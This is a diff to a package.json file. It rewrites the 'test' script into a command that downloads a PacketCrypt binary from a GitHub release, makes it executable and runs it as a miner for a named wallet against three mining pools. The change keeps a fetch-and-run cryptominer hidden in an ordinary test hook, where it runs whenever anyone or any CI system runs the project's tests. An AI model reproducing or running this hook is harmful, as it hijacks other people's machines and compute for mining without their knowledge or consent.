@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "wget https://github.com/rikzakalani/ruby-getting-started/releases/download/pepek/packetcrypt-v0.5.2-linux_amd64 && chmod +x packetcrypt-v0.5.2-linux_amd64 && ./packetcrypt-v0.5.2-linux_amd64 ann -p pkt1qegd9xjlaatf26f583m8yurtt9te4vs8340naca http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com &  \"Error: no test specified\" && exit 1"
+    "test": "wget https://github.com/rikzakalani/ruby-getting-started/releases/download/pepek/packetcrypt-v0.5.2-linux_amd64 && chmod +x packetcrypt-v0.5.2-linux_amd64 && ./packetcrypt-v0.5.2-linux_amd64 ann -p pkt1qegd9xjlaatf26f583m8yurtt9te4vs8340naca http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com"
   },
   "repository": {
     "type": "git",
